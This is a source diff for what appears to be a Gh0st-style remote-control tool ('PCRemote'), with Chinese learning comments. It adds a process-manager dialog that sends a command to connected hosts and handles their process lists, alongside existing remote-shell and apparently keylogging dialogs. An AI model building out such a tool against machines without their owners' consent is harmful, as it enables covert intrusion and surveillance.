@@ -9,6 +9,7 @@
 #include "SettingDlg.h"
 #include "../thirdpart/macros.h"
 #include "ShellDlg.h"
+#include "SystemDlg.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -126,6 +127,7 @@ BEGIN_MESSAGE_MAP(CPCRemoteDlg, CDialogEx)
 	ON_COMMAND(IDM_NOTIFY_CLOSE, &CPCRemoteDlg::OnNotifyClose)
 	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)        //跟进  OnAddToList
 	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
+	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
 	ON_WM_CLOSE()
 END_MESSAGE_MAP()
 
@@ -475,7 +477,24 @@ void CPCRemoteDlg::OnOnlineFile()
 void CPCRemoteDlg::OnOnlineProcess()
 {
 	// TODO: 在此添加命令处理程序代码
-	MessageBox("进程管理");
+//	MessageBox("进程管理");
+	BYTE	bToken = COMMAND_SYSTEM;         //赋值一个宏 然后发送到服务端，到服务端搜索COMMAND_SYSTEM
+	SendSelectCommand(&bToken, sizeof(BYTE));
+}
+
+LRESULT CPCRemoteDlg::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
+{
+	ClientContext	*pContext = (ClientContext *)lParam;
+	CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);  //动态创建CSystemDlg
+
+	// 设置父窗口为卓面
+	dlg->Create(IDD_SYSTEM_DIALOG, GetDesktopWindow());      //创建对话框
+	dlg->ShowWindow(SW_SHOW);                      //显示对话框
+
+	pContext->m_Dialog[0] = SYSTEM_DLG;              //这个值用做服务端再次发送数据时的标识
+	pContext->m_Dialog[1] = (int)dlg;
+	//先看一下这个对话框的界面再看这个对话框类的构造函数
+	return 0;
 }
 
 
@@ -796,10 +815,10 @@ void CPCRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 	break;
 	case KEYBOARD_DLG:
 	((CKeyBoardDlg *)dlg)->OnReceiveComplete();
-	break;
+	break;*/
 	case SYSTEM_DLG:
 	((CSystemDlg *)dlg)->OnReceiveComplete();
-	break;*/
+	break;
 	case SHELL_DLG:
 	((CShellDlg *)dlg)->OnReceiveComplete();
 	break;
@@ -853,10 +872,12 @@ void CPCRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 	break;
 	case TOKEN_KEYBOARD_START:
 	g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
-	break;
-	case TOKEN_PSLIST:
-	g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
 	break;*/
+	case TOKEN_PSLIST:
+	{
+		g_pPCRemoteDlg->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
+	}		
+	break;
 	case TOKEN_SHELL_START:
 	{
 		g_pPCRemoteDlg->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
